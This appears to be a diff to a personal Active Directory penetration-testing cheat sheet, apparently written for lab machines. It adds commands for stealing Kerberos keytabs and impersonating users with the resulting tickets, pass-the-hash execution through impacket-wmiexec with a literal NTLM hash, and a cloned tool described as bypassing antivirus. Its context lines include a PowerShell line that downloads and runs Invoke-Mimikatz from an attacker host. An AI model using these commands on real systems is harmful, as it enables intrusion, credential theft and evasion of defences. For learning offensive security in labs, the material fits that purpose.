@@ -44,6 +44,7 @@ toc: true
 - **Always Check the Network interfaces on every machine that we get access to , we can do a ping Sweep (In Cross Forest)**
 - **Import the agent for Ligolo and route the trafic .**
 - **Make sure you modify the Host file to have DC as Domain Name as well (Only DC)**
+- **Check Kerberos related files , we can use klist to get the TGT to impersonate users (check Kerberos Section in Post Exploitation)**
 
 
 ## Enumeration :
@@ -378,7 +379,14 @@ background
 stty raw -echo; fg
 export TERM=xterm
 ```
-
+```bash
+==> Using script instead of Python :
+script /dev/null -c bash
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'
+```
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ssty -a : this will give us the rows and columns . 
@@ -890,7 +898,9 @@ kerbrute userenum /usr/share/Usernames/Names/names.txt --dc $target -d Domain
 netexec smb $target -u 'Username' -p 'Password' --rid-brute : Generate a list of users .
 
 netexec smb $target -u 'Username' -p 'Password' --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt 
- 
+
+nxc smb Anomaly-DC.anomaly.hsm -u 'Brandon_Boyd' -k --use-kcache --rid-brute : Using Kerberos Ticket . 
+
 ```
 
 #### ASREP Roasting :
@@ -1013,6 +1023,8 @@ if we look at the Enrollment Rights , those are the users that can modify a that
 Check certipy wiki for more info about how to abuse it . 
 
 ===> certipy-ad find -u 'Username' -p 'Password' -dc-ip $target -vulnerable .
+
+==> certipy-ad find -target 'Anomaly-DC.anomaly.hsm' -u 'Brandon_Boyd@anomaly.hsm' -k -no-pass -dc-ip $target -vulnerable -stdout
 
 ===> certipy-ad find -u 'Username' -hashes :NTLMHash -dc-ip $target -stdout -vulnerable . 
 
@@ -1244,6 +1256,9 @@ sudo bloodhound --no-sandbox
 # Ingestors : 
 
 bloodhound-python -u nik -p 'ToastyBoi!' -ns 10.113.189.188 -d LAB.ENTERPRISE.THM -c all
+
+# Using a TGT :
+bloodhound-python -u 'Brandon_Boyd' -d 'anomaly.hsm' -dc 'Anomaly-DC.anomaly.hsm' -ns $target -c all -k -no-pass --dns-tcp --zip
 ```
 
 **Using Blood Hound :** 
@@ -1719,6 +1734,19 @@ sudo openssl pkcs12 -in yourPFXFile.pfx -clcerts -nokeys -out yourExtractedEntit
 evil-winrm -i IP -k PublicKeyExtracted -c CertExtracted -S 
 
 xfreerdp /v:$target /u:username /p:password /cert:ignore +clipboard /dynamic-resolution /drive:  + net use will show our shared drive content . 
+
+# Via WMI :
+
+impacket-wmiexec anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'
+
+To Bypass AV use WMIexec2 :
+https://github.com/ice-wzl/wmiexec2
+git clone https://github.com/ice-wzl/wmiexec2.git
+cd wmiexec2/
+python3 -m venv venv
+source venv/bin/activate
+pip3 install -r requirements.txt
+python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'
 ```
 
 ## Post Exploitation :
@@ -1782,6 +1810,7 @@ certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -accoun
  
 ```
 
+
 ### Mimikatz :
 
 ```bash
@@ -1792,6 +1821,35 @@ certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -accoun
 powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString("http://KALIIP/Invoke-mimikatz.ps1");Invoke-Mimikatz 
 
 ```
+
+### Kerberos Conf : 
+
+```bash
+==> We need 2 important files :
+/etc/krb5.conf — reveals the realm, KDC address, and confirms AD domain membership
+/etc/krb5.keytab — if readable, contains principal keys that allow direct TGT requests without knowing the password
+
+==> Copy conf file to our /etc/krb5.conf : to copy Realms info ....
+
+==> To import the TGT from the Keytab :
+
+1/ List the Principle name :
+klist -kt krb5.keytab
+
+2/ Request the TGT 
+kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM
+
+3/ Verify :
+klist
+
+4/ Export the ticket to our ENV variables :
+export KRB5CCNAME=/tmp/krb5cc_1000
+
+5/ Use it :
+nxc smb Anomaly-DC.anomaly.hsm -u 'Brandon_Boyd' -k --use-kcache
+
+```
+
 
 ## Useful stuff :
 
